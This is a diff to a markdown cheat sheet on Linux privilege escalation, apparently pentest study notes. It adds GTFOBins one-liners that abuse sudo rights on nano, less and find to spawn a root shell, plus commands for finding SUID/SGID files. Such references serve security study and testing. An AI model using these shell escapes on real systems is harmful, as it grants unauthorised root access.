@@ -31,11 +31,6 @@ env
 echo $PATH
 ```
 
-### Sudo Privileges
-```
-sudo -l
-```
-
 ### Network Informations
 
 ```
@@ -90,15 +85,42 @@ find / -type f -perm -4000 -ls 2>/dev/null  #files with suid permission (long li
 - [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 - [Linux Priv Checker](https://github.com/linted/linuxprivchecker)
 
+### Sudo Privileges
 
+#### Checking For `sudo` Permissions
+```
+sudo -l
+```
+#### Abusing `sudo` permission on `nano`
+The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/nano/)
+```
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+
+#### Abusing `sudo` permission on `less`
+The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/less/)
+```
+sudo less /etc/profile
+!/bin/sh
+```
+
+#### Abusing `sudo` permission on `find`
+The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/find/)
+```
+sudo find . -exec /bin/sh \; -quit
+```
 
 ### SUID and SGID
 
+#### Finding Files with SUID/SGID Permissions
 ```
 find / -type f -perm -4000 -ls 2>/dev/null #print suid files and also sgid fils
 find / -type f -perm -2000 -ls 2>/dev/null #print only sgid files
 ```
 
+#### SUID vs SGID 
 ```
 SUID (SetUID):
         Octal value: 4000
